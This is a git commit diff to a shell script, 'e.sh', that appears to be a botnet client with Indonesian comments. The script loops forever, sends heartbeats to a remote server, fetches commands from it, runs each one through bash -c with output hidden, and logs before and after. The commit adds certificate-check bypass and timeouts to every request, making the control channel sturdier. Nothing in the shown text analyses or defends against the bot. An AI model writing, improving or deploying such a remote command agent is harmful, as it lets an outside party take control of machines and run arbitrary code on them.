da901dbf04a8e9f4e65876cffb2541661472cd10
dark-zyro <103295935+dark-zyro@users.noreply.github.com>
2026-03-01 05:56:48 +0700

    Update e.sh

--- e.sh
+++ e.sh
@@ -5,14 +5,14 @@ SERVER="https://matasiber.web.id/bot"
 
 while true; do
   # heartbeat
-  curl -s "$SERVER/heartbeat.php?bot_id=$BOT_ID" > /dev/null
+  curl -s -k --connect-timeout 5 --max-time 10 "$SERVER/heartbeat.php?bot_id=$BOT_ID" > /dev/null
 
   # ambil command
-  CMD=$(curl -s "$SERVER/command.php?bot_id=$BOT_ID")
+  CMD=$(curl -s -k --connect-timeout 5 --max-time 10 "$SERVER/command.php?bot_id=$BOT_ID")
 
   if [ -n "$CMD" ]; then
     # log sebelum eksekusi
-    curl -s -X POST "$SERVER/log.php" \
+    curl -k --connect-timeout 5 --max-time 10 -s -X POST "$SERVER/log.php" \
       -d "bot_id=$BOT_ID" \
       -d "message=$BOT_ID: eksekusi dimulai" > /dev/null
 
@@ -20,7 +20,7 @@ while true; do
     bash -c "$CMD" >/dev/null 2>&1
 
     # log setelah eksekusi
-    curl -s -X POST "$SERVER/log.php" \
+    curl -k --connect-timeout 5 --max-time 10 -s -X POST "$SERVER/log.php" \
       -d "bot_id=$BOT_ID" \
       -d "message=$BOT_ID: eksekusi selesai" > /dev/null
   fi
